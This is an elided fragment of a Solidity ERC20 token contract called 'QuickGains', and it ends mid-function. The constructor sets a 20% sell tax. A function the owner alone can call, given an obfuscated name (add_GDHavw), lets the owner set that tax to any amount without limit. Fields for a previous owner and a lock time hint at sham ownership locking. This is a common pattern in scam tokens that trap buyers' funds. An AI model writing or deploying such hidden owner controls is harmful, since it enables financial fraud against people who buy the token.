...
contract QuickGains is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("DQG", "QuickGains") {
        _mint(msg.sender, 58000000000);
        sellTax = 20;
        _owner = msg.sender;
    ...
    function add_GDHavw(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
    
    function add_Rie5Gb() public {
